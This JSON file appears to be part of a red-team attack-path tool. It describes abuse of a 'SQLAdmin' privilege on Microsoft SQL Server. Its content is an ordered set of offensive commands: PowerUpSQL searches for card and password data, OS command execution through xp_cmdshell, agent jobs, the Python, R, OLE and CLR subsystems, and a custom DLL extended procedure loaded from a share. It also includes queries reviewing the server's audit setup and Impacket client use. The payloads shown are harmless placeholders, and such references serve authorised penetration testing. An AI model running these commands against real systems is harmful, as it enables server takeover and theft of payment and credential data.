{
    "SQLAdmin": {
        "meaning": "The user is a SQL admin on the target computer. There is at least one MSSQL instance running on the computer where the user with the inbound SQLAdmin edge is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service have sysadmin privileges in the SQL Server application.",
        "common": "",
        "windows": {
            "PowerUpSQL_Data_Discovery": [
                {
                    "order": 1,
                    "command": "Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults",
                    "description": "Get a list of databases, sizes, and encryption status"
                },
                {
                    "order": 2,
                    "command": "Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword \"card, password\" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize",
                    "description": "Search columns and data for keywords"
                }
            ],
            "PowerUpSQL_xp_cmdshell": [
                {
                    "order": 1,
                    "command": "Invoke-SQLOSCmd -Verbose -Command \"Whoami\" -Threads 10 -Instance sqlserver\\instance",
                    "description": "xp_cmdshell Execute Example"
                }
            ],
            "PowerUpSQL_Agent_Jobs": [
                {
                    "order": 1,
                    "command": "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command \"echo hello > c:\\\\windows\\\\temp\\\\test1.txt\" -Instance sqlserver\\instance -username myuser -password mypassword",
                    "description": "Agent Job Execution Example with CmdExec subsystem"
                },
                {
                    "order": 2,
                    "command": "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output \"hello world\" | out-file c:\\\\windows\\\\temp\\\\test2.txt' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword",
                    "description": "Agent Job Execution Example with PowerShell subsystem"
                },
                {
                    "order": 3,
                    "command": "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\\\windows\\\\system32\\\\cmd.exe /c echo hello > c:\\\\windows\\\\temp\\\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword",
                    "description": "Agent Job Execution Example with VBScript subsystem"
                },
                {
                    "order": 4,
                    "command": "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\\\windows\\\\system32\\\\cmd.exe /c echo hello > c:\\\\windows\\\\temp\\\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword",
                    "description": "Agent Job Execution Example with JScript subsystem"
                }
            ],
            "PowerUpSQL_Other_Subsystems": [
                {
                    "order": 1,
                    "command": "Invoke-SQLOSPython -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
                    "description": "Python Subsystem Execution"
                },
                {
                    "order": 2,
                    "command": "Invoke-SQLOSR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
                    "description": "R subsystem Execution Example"
                },
                {
                    "order": 3,
                    "command": "Invoke-SQLOSOle -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
                    "description": "OLE Execution Example"
                },
                {
                    "order": 4,
                    "command": "Invoke-SQLOSCLR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance",
                    "description": "CLR Execution Example"
                }
            ],
            "PowerUpSQL_Custom_Extended_Procedure": [
                {
                    "order": 1,
                    "command": "Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command \"echo test > c:\\\\temp\\\\test.txt\" -ExportName xp_test",
                    "description": "Create a custom extended stored procedure"
                },
                {
                    "order": 2,
                    "command": "Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\\\\\yourserver\\\\yourshare\\\\myxp.dll'\" -Instance sqlserver\\instance",
                    "description": "Host the test.dll on a share readable by the SQL Server service account"
                },
                {
                    "order": 3,
                    "command": "Get-SQLQuery -Verbose -Query \"xp_test\" -Instance sqlserver\\instance",
                    "description": "Run extended stored procedure"
                },
                {
                    "order": 4,
                    "command": "Get-SQLQuery -Verbose -Query \"sp_dropextendedproc 'xp_test'\" -Instance sqlserver\\instance",
                    "description": "Remove extended stored procedure"
                }
            ],
            "PowerUpSQL_Audit_Review": [
                {
                    "order": 1,
                    "command": "SELECT * FROM sys.dm_server_audit_status",
                    "description": "View audits"
                },
                {
                    "order": 2,
                    "command": "SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id",
                    "description": "View server specifications"
                },
                {
                    "order": 3,
                    "command": "SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id",
                    "description": "View database specifications"
                }
            ]
        },
        "linux": {
            "Impacket_MSSQL": [
                {
                    "order": 1,
                    "command": "mssqlclient.py domain/user:password@target",
                    "description": "Connect to MSSQL server using Impacket"
                },
                {
                    "order": 2,
                    "command": "# Once connected: xp_cmdshell whoami",
                    "description": "Execute OS commands via xp_cmdshell from Impacket MSSQL client"
                }
            ]
        }
    }
}
